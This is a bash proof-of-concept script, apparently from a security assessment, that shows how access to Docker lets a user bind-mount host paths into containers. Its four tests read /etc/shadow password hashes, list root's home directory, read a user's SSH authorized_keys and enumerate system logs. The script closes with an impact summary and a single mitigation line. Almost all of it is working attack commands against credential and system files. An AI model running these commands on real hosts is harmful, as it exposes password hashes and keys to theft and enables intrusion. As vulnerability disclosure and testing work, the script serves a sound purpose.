#!/bin/bash
# Proof of Concept: Host Filesystem Data Exfiltration
# Severity: HIGH (CVSS 8.1)
# Description: Demonstrates complete host filesystem access and data theft

echo "=================================================================="
echo "PoC: Data Exfiltration via Host Filesystem Access"
echo "=================================================================="
echo ""

echo "[*] Demonstrating ability to read ANY file from host system"
echo ""

echo "=================================================================="
echo "Test 1: Read /etc/shadow (password hashes)"
echo "=================================================================="
echo ""
docker run --rm -v /etc/shadow:/host_shadow:ro alpine sh -c "
  echo '[+] Mounting /etc/shadow from host...'
  echo '[+] Content:'
  cat /host_shadow | head -5
  echo ''
  echo '[!] SUCCESS: Can read password hashes!'
"

echo ""
echo "=================================================================="
echo "Test 2: Access root's home directory"
echo "=================================================================="
echo ""
docker run --rm -v /root:/host_root:ro alpine sh -c "
  echo '[+] Mounting /root from host...'
  echo '[+] Directory listing:'
  ls -la /host_root 2>/dev/null | head -10
  echo ''
  echo '[!] SUCCESS: Can list root files!'
"

echo ""
echo "=================================================================="
echo "Test 3: Steal SSH authorized_keys"
echo "=================================================================="
echo ""
docker run --rm -v /home/packer/.ssh/authorized_keys:/auth_keys:ro alpine sh -c "
  echo '[+] Mounting SSH keys from host...'
  echo '[+] Authorized keys:'
  cat /auth_keys 2>/dev/null | head -3
  echo ''
  echo '[!] SUCCESS: Can steal SSH keys!'
"

echo ""
echo "=================================================================="
echo "Test 4: Access system logs"
echo "=================================================================="
echo ""
docker run --rm -v /var/log:/host_logs:ro alpine sh -c "
  echo '[+] Mounting /var/log from host...'
  echo '[+] Available logs:'
  find /host_logs -name '*.log' 2>/dev/null | head -10
  echo ''
  echo '[!] SUCCESS: Can read system logs!'
"

echo ""
echo "=================================================================="
echo "Impact Assessment"
echo "=================================================================="
echo ""
echo "✓ Data Exfiltration: Can read any host file"
echo "✓ Credential Theft: SSH keys, tokens accessible"
echo "✓ Information Disclosure: System configs, logs"
echo "✓ No Authentication: Direct filesystem access"
echo "✓ Any Directory: Can mount ANY path from host"
echo ""
echo "Severity: HIGH (CVSS 8.1)"
echo "Mitigation: Restrict volume mount paths"
echo ""
